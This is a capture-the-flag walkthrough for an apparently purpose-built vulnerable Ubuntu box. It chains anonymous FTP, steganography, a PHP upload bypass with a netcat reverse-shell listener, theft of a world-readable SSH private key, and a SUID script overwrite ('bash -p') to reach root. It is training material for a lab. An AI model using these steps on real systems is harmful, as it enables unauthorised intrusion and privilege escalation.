# LaZzyCorp: Lazy Reset

---

*By ItsMhaa*

> Welcome to DevCorp — where mistakes are meant to be reset.
> 

In this **easy-to-medium** difficulty CTF, you step into the shoes of a security researcher investigating a **careless developer’s internal staging machine**.

What starts with anonymous FTP access slowly unravels into a multi-step chain of **steganography**, **web exploitation**, **SSH hijacking**, and a **SUID binary that resets more than just the website** 😏

---

## Box Information

```
Name: LaZzyCorp: Lazy Reset
Difficulty: Easy-Medium
Creator: ItsMhaa
OS: Ubuntu 20.04
IP: [Dynamic/Static – e.g., 192.168.1.150]
```

---

## Story

DevCorp is a startup working on a blog platform. Their junior dev, Arvind, has been testing things on a local server — but in classic lazy fashion, he’s left behind:

- Sensitive developer notes
- A hidden image in FTP
- His personal SSH key
- And worst of all… a **reset tool that runs as root** 🧨

Your goal?

**Pivot from anonymous FTP to full root** by chaining together misconfigs, forgotten files, and one poorly secured script.

---

## Summary

A misconfigured FTP server and a lazy reset tool set the stage for your exploitation path.

Expect a mix of:

- Steganography
- Upload bypasses
- Permission abuse
- A clean privilege escalation path
- Minimal guesswork, maximum fun!

---

## Step 1 – Recon Phase

- Run `nmap` → open ports: **21 (FTP), 80 (HTTP), 22 (SSH)**
- Try anonymous FTP → **Success**
- Inside `/pub/`, you find:
    
    ✅ `note.jpg`
    
    (Note:- Make sure while downloading file you use binary mode of FTP. )
    

---

## Step 2 – Steganography & Foothold

- Extract hidden data using:
    
    ```bash
    steghide extract -sf note.jpg
    ```
    
- Hidden creds discovered inside:
    
    ```
    Username: dev
    Password: ****
    
    ```
    
- Visit the site → `/login`
- Upload `shell.php` using extension bypass: `.php.upload`
- Start listener:
    
    ```bash
    nc -lvnp 4444
    
    ```
    
- Trigger uploaded shell → gain **reverse shell as www-data**

---

## Step 3 – User Escalation (SSH as Arvind)

- While in shell:
    
    ```bash
    cat /home/arvind/.ssh/id_rsa
    
    ```
    
- File is world-readable
- Copy it to your attacker box → Save as `id_rsa` → `chmod 600 id_rsa`
- SSH into:
    
    ```bash
    ssh -i id_rsa arvind@<target-ip>
    
    ```
    

---

## Step 4 – Privilege Escalation (SUID Reset)

- List SUID binaries:
    
    ```bash
    find / -perm -4000 2>/dev/null
    
    ```
    
- You find:
    
    ```bash
    /home/arvind/reset
    
    ```
    
- It runs:
    
    ```bash
    /usr/bin/reset_site.sh
    
    ```
    
- And that file is **writable by *arvind***
- Modify it:
    
    ```bash
    echo 'bash -p' > /usr/bin/reset_site.sh
    
    ```
    
- Now run:
    
    ```bash
    /home/arvind/reset
    
    ```
    
- BOOM → Root shell 

---

## Step 5 – Flags

```
/home/arvind/user.txt   →  FLAG{****}

/root/root.txt          →  FLAG{*****}

```

---

## 🧠 What You Learned

✅ Steganography + FTP

✅ Web login & PHP upload bypass

✅ Reading SSH keys from web shells

✅ SSH pivoting

✅ SUID + script poisoning for root access

---

## 💬 Final Thoughts

This box was made for:

- Beginners learning post-exploitation
- People wanting story-based lateral movement
- CTF lovers who enjoy clean logic over rabbit holes

Made with ❤️ by ItsMhaa

LinkedIn: [www.linkedin.com/in/mohammad-husain-ajani](http://www.linkedin.com/in/mohammad-husain-ajani) 

GitHub: https://github.com/mohammadajani/mohammadajani

Notion Walkthrough: [LaZzyCorp: Lazy Reset](https://www.notion.so/LaZzyCorp-Lazy-Reset-232f6840ffbe80fca6c8c92bec2b02b7?pvs=21) 

---
